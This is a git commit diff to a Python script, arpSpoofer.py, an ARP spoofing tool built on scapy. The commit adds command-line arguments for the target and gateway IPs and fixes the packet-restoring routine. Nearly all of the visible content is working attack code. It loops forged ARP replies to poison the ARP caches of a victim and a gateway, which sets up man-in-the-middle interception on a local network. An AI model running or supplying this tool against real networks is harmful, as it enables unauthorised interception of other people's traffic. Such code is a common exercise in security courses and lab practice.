3957a10d5ebdd7085027dc906302fe5dd86d3056
S$Y <syedyasser728@gmail.com>
2026-09-24 11:47:25 +0530

    ARP spoofer tool implemented using Python [cleaned]

--- arpSpoofer.py
+++ arpSpoofer.py
@@ -1,6 +1,18 @@
 import scapy.all as scapy
 import time
 import sys
+import argparse
+
+def getArgs():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
+    parser.add_argument("-t", "--target", dest="target", help="Target IP")
+    options = parser.parse_args()
+    if not options.gateway:
+        parser.error("[-] Please specify IP of gateway, use --help or -h for more information")
+    elif not options.target:
+        parser.error("[-] Please specify IP of target, use --help or -h for more information")
+    return options
 
 def getMAC(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -16,17 +28,19 @@ def spoof(targetIP, spoofIP):
     ether = scapy.Ether(dst=targetMAC)
     ARPpacket = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
     packet = ether / ARPpacket
-    # packet.show()
     scapy.sendp(packet, verbose=0)
 
 def restore(destIP, srcIP):
     destMAC = getMAC(destIP)
     srcMAC = getMAC(srcIP)
+    ether = scapy.Ether(dst=destMAC)
     restorePacket = scapy.ARP(op=2, pdst=destIP, hwdst=destMAC, psrc=srcIP, hwsrc=srcMAC)
-    scapy.sendp(restorePacket, verbose=0, count=4)
+    packet = ether / restorePacket
+    scapy.sendp(packet, verbose=0, count=4)
 
-targetIP = "192.168.101.128"
-gatewayIP = "192.168.101.2"
+options = getArgs()
+targetIP = options.target
+gatewayIP = options.gateway
 
 try:
     packetsCount = 0
@@ -35,6 +49,7 @@ try:
         spoof(gatewayIP, targetIP)
         packetsCount += 2
         print("\r[+] Sent " + str(packetsCount) + " packets", end="")
+        sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
     print("\n>>Ctrl+C detected; Restoring ARP tables and exiting program...")
